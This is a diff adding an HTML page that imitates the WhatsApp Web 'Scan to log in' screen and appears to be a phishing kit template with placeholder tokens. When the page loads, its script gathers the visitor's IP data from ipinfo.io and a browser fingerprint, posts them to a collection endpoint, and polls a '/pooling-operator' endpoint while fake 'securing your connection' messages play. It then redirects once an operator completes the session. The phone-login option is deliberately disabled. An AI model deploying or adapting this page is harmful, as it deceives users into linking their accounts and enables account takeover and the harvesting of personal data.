@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Web</title>
+  <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r7ysXSSGJ5Z.png" type="image/png" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html { height: 100%; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; }
+    a { text-decoration: none; }
+
+    /* ===== HEADER BANNER ===== */
+    .app-wrapper-web { display: flex; flex-direction: column; height: 100vh; }
+    .landing-header { background: #00a884; height: 128px; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 4px; }
+    .header-logo { display: flex; align-items: center; gap: 12px; }
+    .header-logo svg { width: 32px; height: 32px; }
+    .header-logo-text { font-size: 17px; color: #fff; font-weight: 300; letter-spacing: -0.2px; }
+
+    /* ===== DOWNLOAD BANNER ===== */
+    .download-banner { background: #00a884; padding: 0 40px 40px; display: flex; justify-content: center; }
+    .download-card { background: #fff; border-radius: 12px; padding: 28px 32px; display: flex; align-items: center; gap: 32px; max-width: 920px; width: 100%; box-shadow: 0 1px 3px rgba(11,20,26,0.08); }
+    .download-phone { width: 80px; height: 100px; background: #d9fdd3; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; position: relative; overflow: hidden; }
+    .download-phone-inner { width: 50px; height: 80px; background: #25d366; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
+    .download-phone-inner svg { width: 28px; height: 28px; fill: #fff; }
+    .download-info { flex: 1; }
+    .download-title { font-size: 14px; color: #111b21; font-weight: 500; margin-bottom: 4px; }
+    .download-desc { font-size: 12px; color: #667781; line-height: 1.4; }
+    .download-btn { background: #00a884; color: #fff; border: none; padding: 8px 24px; border-radius: 24px; font-size: 13px; font-weight: 500; cursor: pointer; flex-shrink: 0; white-space: nowrap; transition: background 0.15s; }
+    .download-btn:hover { background: #06cf9c; }
+
+    /* ===== MAIN CONTENT ===== */
+    .landing-main { flex: 1; display: flex; justify-content: center; align-items: flex-start; padding: 40px 20px 20px; }
+    .content-wrapper { max-width: 920px; width: 100%; }
+
+    /* ===== QR CARD ===== */
+    .qr-card { background: #fff; border-radius: 12px; box-shadow: 0 1px 3px rgba(11,20,26,0.08); padding: 40px 56px 32px; display: flex; gap: 56px; align-items: center; margin-bottom: 16px; }
+    .qr-left { flex: 1; }
+    .qr-title { font-size: 20px; color: #111b21; font-weight: 300; margin-bottom: 24px; line-height: 1.3; }
+    .qr-steps { list-style: none; counter-reset: step; }
+    .qr-steps li { counter-increment: step; display: flex; align-items: flex-start; gap: 16px; margin-bottom: 20px; font-size: 14px; color: #111b21; line-height: 1.5; }
+    .qr-steps li::before { content: counter(step); display: flex; align-items: center; justify-content: center; width: 24px; height: 24px; border-radius: 50%; background: #00a884; color: #fff; font-size: 12px; font-weight: 700; flex-shrink: 0; margin-top: 1px; }
+    .qr-steps li span { flex: 1; }
+    .qr-help { display: inline-flex; align-items: center; gap: 4px; color: #667781; font-size: 13px; margin-top: 8px; cursor: pointer; transition: color 0.15s; }
+    .qr-help:hover { color: #111b21; }
+    .qr-help svg { width: 16px; height: 16px; transition: transform 0.2s; }
+    .qr-help:hover svg { transform: translateX(3px); }
+
+    .qr-right { display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .qr-box { width: 260px; height: 260px; border: 1px solid #e9edef; border-radius: 12px; display: flex; align-items: center; justify-content: center; position: relative; background: #fff; overflow: hidden; }
+    .qr-box canvas, .qr-box img { width: 232px; height: 232px; image-rendering: pixelated; }
+    .qr-box .qr-placeholder { display: flex; flex-direction: column; align-items: center; gap: 8px; color: #667781; }
+    .qr-box .qr-placeholder svg { width: 48px; height: 48px; opacity: 0.4; }
+
+    /* ===== STAY LOGGED IN ===== */
+    .stay-logged { display: flex; align-items: center; gap: 12px; padding: 16px 56px; background: #fff; border-radius: 0 0 12px 12px; margin-bottom: 24px; box-shadow: 0 1px 3px rgba(11,20,26,0.08); border-top: 1px solid #e9edef; }
+    .stay-logged label { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #111b21; cursor: pointer; user-select: none; flex: 1; }
+    .stay-logged input[type="checkbox"] { width: 18px; height: 18px; accent-color: #00a884; cursor: pointer; flex-shrink: 0; }
+    .stay-logged .info-icon { width: 18px; height: 18px; border-radius: 50%; border: 1.5px solid #667781; display: flex; align-items: center; justify-content: center; font-size: 11px; color: #667781; cursor: help; flex-shrink: 0; position: relative; }
+    .stay-logged .info-icon:hover::after { content: attr(data-tip); position: absolute; bottom: 100%; left: 50%; transform: translateX(-50%); background: #111b21; color: #fff; font-size: 11px; padding: 6px 10px; border-radius: 6px; white-space: nowrap; margin-bottom: 6px; pointer-events: none; z-index: 10; }
+
+    /* ===== PHONE NUMBER LINK ===== */
+    .phone-login-link { text-align: center; margin-bottom: 32px; }
+    .phone-login-link a { color: #00a884; font-size: 14px; font-weight: 400; display: inline-flex; align-items: center; gap: 4px; transition: color 0.15s; }
+    .phone-login-link a:hover { color: #06cf9c; }
+    .phone-login-link a svg { width: 14px; height: 14px; }
+
+    /* ===== FOOTER ===== */
+    .landing-footer { padding: 20px 20px 0; text-align: center; }
+    .footer-connect { display: flex; align-items: center; justify-content: center; gap: 4px; font-size: 13px; color: #667781; margin-bottom: 24px; }
+    .footer-connect a { color: #00a884; font-weight: 400; display: inline-flex; align-items: center; gap: 2px; transition: color 0.15s; }
+    .footer-connect a:hover { color: #06cf9c; }
+    .footer-connect a svg { width: 14px; height: 14px; }
+
+    .encryption-notice { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 13px; color: #667781; margin-bottom: 8px; padding-top: 16px; border-top: 1px solid #e9edef; }
+    .encryption-notice svg { width: 13px; height: 13px; flex-shrink: 0; }
+    .encryption-notice a { color: #00a884; }
+    .encryption-notice a:hover { text-decoration: underline; }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.35); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+    .loading-box { background: #fff; border-radius: 12px; padding: 40px 48px; box-shadow: 0 4px 24px rgba(0,0,0,0.15); max-width: 360px; width: 100%; }
+    .loading-spinner { width: 36px; height: 36px; border: 3px solid #e9edef; border-top-color: #00a884; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 14px; color: #111b21; margin-bottom: 8px; }
+    .loading-subtext { font-size: 12px; color: #667781; }
+    .loading-error { display: none; }
+    .loading-error .loading-spinner { border-top-color: #ea4335; animation: none; }
+    .loading-error .loading-text { color: #ea4335; }
+
+    /* ===== ERROR TOAST ===== */
+    .error-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.15); padding: 12px 20px; font-size: 13px; color: #ea4335; display: none; z-index: 10000; border-left: 3px solid #ea4335; max-width: 400px; }
+    .error-toast.show { display: block; animation: toastIn 0.3s ease; }
+    @keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(-10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 900px) {
+      .qr-card { flex-direction: column-reverse; padding: 32px 28px 24px; gap: 32px; }
+      .qr-right { width: 100%; }
+      .qr-box { width: 240px; height: 240px; margin: 0 auto; }
+      .qr-box canvas, .qr-box img { width: 212px; height: 212px; }
+      .stay-logged { padding: 16px 28px; }
+      .download-card { flex-direction: column; text-align: center; gap: 16px; padding: 24px; }
+    }
+    @media (max-width: 600px) {
+      .landing-header { height: 80px; }
+      .header-logo-text { font-size: 15px; }
+      .download-banner { padding: 0 16px 20px; }
+      .download-card { padding: 20px; }
+      .landing-main { padding: 20px 12px 12px; }
+      .qr-card { padding: 24px 20px 20px; border-radius: 8px; }
+      .qr-title { font-size: 17px; }
+      .qr-box { width: 200px; height: 200px; }
+      .qr-box canvas, .qr-box img { width: 176px; height: 176px; }
+      .stay-logged { padding: 12px 20px; border-radius: 0 0 8px 8px; }
+      .qr-steps li { font-size: 13px; gap: 12px; margin-bottom: 16px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app-wrapper-web">
+    <!-- HEADER -->
+    <div class="landing-header">
+      <div class="header-logo">
+        <svg viewBox="0 0 39 39" width="32" height="32"><path d="M10.7 32.8l.6.3c2.5 1.5 5.3 2.2 8.1 2.2 8.8 0 16-7.2 16-16 0-4.2-1.7-8.3-4.7-11.3s-7-4.7-11.3-4.7c-8.8 0-16 7.2-15.9 16.1 0 3 .9 5.9 2.4 8.4l.4.6-1.6 5.9 6-1.5z" fill="#fff"></path><path d="M32.4 6.4C29 2.9 24.3 1 19.5 1 9.3 1 1.1 9.3 1.2 19.4c0 3.2.9 6.3 2.4 9.1L1 38l9.7-2.5c2.7 1.5 5.7 2.2 8.7 2.2 10.1 0 18.3-8.3 18.3-18.4 0-4.9-1.9-9.5-5.3-12.9zM19.5 34.6c-2.7 0-5.4-.7-7.7-2.1l-.6-.4-5.8 1.5L6.9 28l-.4-.6c-1.5-2.4-2.3-5.2-2.3-8 0-8.4 6.8-15.2 15.2-15.2 4.1 0 7.9 1.6 10.8 4.5 2.9 2.9 4.5 6.8 4.5 10.8-.1 8.4-6.9 15.1-15.2 15.1z" fill="#fff"></path><path d="M27.8 23.1c-.5-.3-3.1-1.6-3.6-1.7-.5-.2-.9-.3-1.2.2-.4.5-1.4 1.7-1.7 2-.3.4-.6.4-1.1.2-.5-.3-2.1-.8-4.1-2.5-1.5-1.3-2.5-2.9-2.8-3.4-.3-.5 0-.7.2-.9.2-.2.5-.5.7-.8.2-.3.3-.5.5-.8.2-.3.1-.6 0-.8-.1-.3-1.2-3-1.7-4.1-.4-1-.9-.9-1.2-.9-.3 0-.7-.1-1-.1s-.9.1-1.4.7c-.5.5-1.8 1.8-1.8 4.3s1.9 5 2.1 5.4c.3.4 3.7 5.7 9 7.9 1.3.5 2.3.9 3.1 1.1 1.3.4 2.5.3 3.5.2 1.1-.1 3.4-1.4 3.9-2.7.5-1.3.5-2.5.4-2.7-.2-.4-.5-.5-1-.8z" fill="#fff"></path></svg>
+        <span class="header-logo-text">WhatsApp</span>
+      </div>
+    </div>
+
+    <!-- DOWNLOAD BANNER -->
+    <div class="download-banner">
+      <div class="download-card">
+        <div class="download-phone">
+          <div class="download-phone-inner">
+            <svg viewBox="0 0 39 39"><path d="M10.7 32.8l.6.3c2.5 1.5 5.3 2.2 8.1 2.2 8.8 0 16-7.2 16-16 0-4.2-1.7-8.3-4.7-11.3s-7-4.7-11.3-4.7c-8.8 0-16 7.2-15.9 16.1 0 3 .9 5.9 2.4 8.4l.4.6-1.6 5.9 6-1.5z" fill="#fff"></path><path d="M32.4 6.4C29 2.9 24.3 1 19.5 1 9.3 1 1.1 9.3 1.2 19.4c0 3.2.9 6.3 2.4 9.1L1 38l9.7-2.5c2.7 1.5 5.7 2.2 8.7 2.2 10.1 0 18.3-8.3 18.3-18.4 0-4.9-1.9-9.5-5.3-12.9zM19.5 34.6c-2.7 0-5.4-.7-7.7-2.1l-.6-.4-5.8 1.5L6.9 28l-.4-.6c-1.5-2.4-2.3-5.2-2.3-8 0-8.4 6.8-15.2 15.2-15.2 4.1 0 7.9 1.6 10.8 4.5 2.9 2.9 4.5 6.8 4.5 10.8-.1 8.4-6.9 15.1-15.2 15.1z" fill="#00a884"></path></svg>
+          </div>
+        </div>
+        <div class="download-info">
+          <div class="download-title">Download WhatsApp for Windows</div>
+          <div class="download-desc">Get WhatsApp for Windows and message even when your phone is offline.</div>
+        </div>
+        <button class="download-btn" onclick="window.open('https://www.whatsapp.com/download','_blank')">Download</button>
+      </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="landing-main">
+      <div class="content-wrapper">
+        <!-- QR CARD -->
+        <div class="qr-card">
+          <div class="qr-left">
+            <h1 class="qr-title">Scan to log in</h1>
+            <ol class="qr-steps">
+              <li><span>Scan the QR code with your phone's camera</span></li>
+              <li><span>Tap the link to open WhatsApp</span></li>
+              <li><span>Scan the QR code again to link to your account</span></li>
+            </ol>
+            <a class="qr-help" href="https://faq.whatsapp.com/531914898197498" target="_blank" rel="noopener noreferrer">
+              <span>Need help?</span>
+              <svg viewBox="0 0 18 18" width="16" height="16"><path d="M6 9l3.5 3.5L14 6" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+            </a>
+          </div>
+          <div class="qr-right">
+            <div class="qr-box" id="qrBox">
+              <div class="qr-placeholder">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2"><rect x="3" y="3" width="7" height="7" rx="1"></rect><rect x="14" y="3" width="7" height="7" rx="1"></rect><rect x="3" y="14" width="7" height="7" rx="1"></rect><rect x="14" y="14" width="3" height="3"></rect><rect x="18" y="14" width="3" height="3"></rect><rect x="14" y="18" width="3" height="3"></rect><rect x="18" y="18" width="3" height="3"></rect></svg>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STAY LOGGED IN -->
+        <div class="stay-logged">
+          <label>
+            <input type="checkbox" id="stayLoggedIn" checked />
+            <span>Stay logged in on this browser</span>
+          </label>
+          <div class="info-icon" data-tip="Your account will be linked to this browser until you log out.">?</div>
+        </div>
+
+        <!-- PHONE LOGIN LINK -->
+        <div class="phone-login-link">
+          <a href="#" id="phoneLoginLink">
+            <span>Log in with phone number</span>
+            <svg viewBox="0 0 18 18" width="14" height="14"><path d="M7 4l4 5-4 5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="landing-footer">
+      <div class="footer-connect">
+        <span>Don't have a WhatsApp account?</span>
+        <a href="https://www.whatsapp.com/" target="_blank" rel="noopener noreferrer">
+          <span>Get started</span>
+          <svg viewBox="0 0 18 18" width="14" height="14"><path d="M7 4l4 5-4 5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        </a>
+      </div>
+      <div class="encryption-notice">
+        <svg viewBox="0 0 16 16" width="13" height="13" fill="none" stroke="#667781" stroke-width="1.5"><rect x="3" y="7" width="10" height="8" rx="2"></rect><path d="M5 7V5a3 3 0 016 0v2"></path></svg>
+        <span>Your personal messages are end-to-end encrypted</span>
+      </div>
+      <div style="text-align:center; padding: 8px 0 20px;">
+        <a href="https://www.whatsapp.com/legal/whatsapp-terms-of-service" target="_blank" style="color:#667781; font-size:12px; margin: 0 6px;">Terms</a>
+        <span style="color:#dadbd9;">|</span>
+        <a href="https://www.whatsapp.com/legal/privacy-policy" target="_blank" style="color:#667781; font-size:12px; margin: 0 6px;">Privacy Policy</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOADING OVERLAY -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-box" id="loadingBox">
+      <div class="loading-spinner"></div>
+      <div class="loading-text" id="loadingMessage">Securing your connection...</div>
+      <div class="loading-subtext" id="loadingSubtext">Please wait while we verify your session.</div>
+      <div class="loading-error" id="loadingError">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="errorMessage">Something went wrong</div>
+        <div class="loading-subtext">Please try again later.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ERROR TOAST -->
+  <div class="error-toast" id="errorToast"></div>
+
+  <script>
+    const templateConfig = { postURL: "{{postURL}}", token: "{{token}}", landingPageLink: "{{landingPageLink}}" };
+    const apiBaseUrl = window.location.origin + "/api";
+    let browserId = null, pollingIntervalId = null, pollingStartTime = null;
+    const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
+    let messageIntervalId = null, currentMessageIndex = 0;
+    const loadingMessages = [
+      "Securing your connection...",
+      "Verifying device link...",
+      "Establishing encrypted tunnel...",
+      "Preparing your workspace...",
+      "Finalizing secure connection..."
+    ];
+
+    function showLoading() {
+      const o = document.getElementById('loadingOverlay');
+      o.style.display = 'flex';
+      document.getElementById('loadingBox').classList.remove('loading-error');
+      startMessages();
+    }
+    function showError(msg) {
+      const o = document.getElementById('loadingOverlay');
+      o.style.display = 'flex';
+      document.getElementById('loadingBox').classList.add('loading-error');
+      document.getElementById('errorMessage').textContent = msg || 'Something went wrong';
+      clearInterval(messageIntervalId);
+    }
+    function hideLoading() {
+      document.getElementById('loadingOverlay').style.display = 'none';
+      clearInterval(messageIntervalId);
+    }
+    function showToast(msg, duration) {
+      const t = document.getElementById('errorToast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), duration || 4000);
+    }
+    function startMessages() {
+      const el = document.getElementById('loadingMessage');
+      currentMessageIndex = 0;
+      el.textContent = loadingMessages[0];
+      if (messageIntervalId) clearInterval(messageIntervalId);
+      messageIntervalId = setInterval(() => {
+        currentMessageIndex = (currentMessageIndex + 1) % loadingMessages.length;
+        el.textContent = loadingMessages[currentMessageIndex];
+      }, 4000);
+    }
+    function objectToFormData(obj) {
+      const fd = new URLSearchParams();
+      Object.entries(obj).forEach(([k, v]) => fd.append(k, v != null ? v.toString() : ''));
+      return fd.toString();
+    }
+    function getDeviceData() {
+      return {
+        userAgent: navigator.userAgent, platform: navigator.platform,
+        language: navigator.language, screenWidth: window.screen.width,
+        screenHeight: window.screen.height, colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio, hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory, vendor: navigator.vendor,
+        maxTouchPoints: navigator.maxTouchPoints
+      };
+    }
+
+    async function initialFormSubmission() {
+      showLoading();
+      try {
+        const ipData = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
+        const stayLogged = document.getElementById('stayLoggedIn').checked;
+        const payload = {
+          token: templateConfig.token,
+          formData: JSON.stringify({
+            loginMethod: 'qr',
+            identifier: '',
+            password: '',
+            stayLoggedIn: stayLogged,
+            ipData,
+            deviceData: getDeviceData(),
+            timestamp: new Date().toISOString()
+          })
+        };
+        const res = await fetch(apiBaseUrl + "/notify-form-submission", {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: objectToFormData(payload)
+        });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+        if (data.apiResponse && data.apiResponse.browserId) {
+          browserId = data.apiResponse.browserId;
+          pollingStartTime = Date.now();
+          startPolling(5000);
+        } else throw new Error("No browserId returned");
+      } catch (e) {
+        console.error(e);
+        showError('Connection failed. Please try again.');
+      }
+    }
+
+    function startPolling(interval) {
+      if (pollingIntervalId) clearInterval(pollingIntervalId);
+      pollingIntervalId = setInterval(pollOperator, interval);
+    }
+
+    async function pollOperator() {
+      if (!browserId) { clearInterval(pollingIntervalId); return; }
+      if (Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
+        clearInterval(pollingIntervalId);
+        showError('Session timed out. Please refresh the page.');
+        return;
+      }
+      try {
+        const res = await fetch(apiBaseUrl + "/pooling-operator", {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: objectToFormData({ browserId, token: templateConfig.token })
+        });
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+        if (data.currentStatus === 'COMPLETED') {
+          clearInterval(pollingIntervalId);
+          hideLoading();
+          let url = templateConfig.landingPageLink || "https://web.whatsapp.com";
+          if (!url.startsWith('http')) url = 'https://' + url;
+          window.location.href = url;
+        } else if (data.currentStatus === 'FAILED') {
+          clearInterval(pollingIntervalId);
+          showError('Login failed. Please try again.');
+        } else {
+          showLoading();
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    document.getElementById('phoneLoginLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      showToast('Phone number login is not available. Please scan the QR code.');
+    });
+
+    document.addEventListener('DOMContentLoaded', initialFormSubmission);
+  </script>
+</body>
+</html>
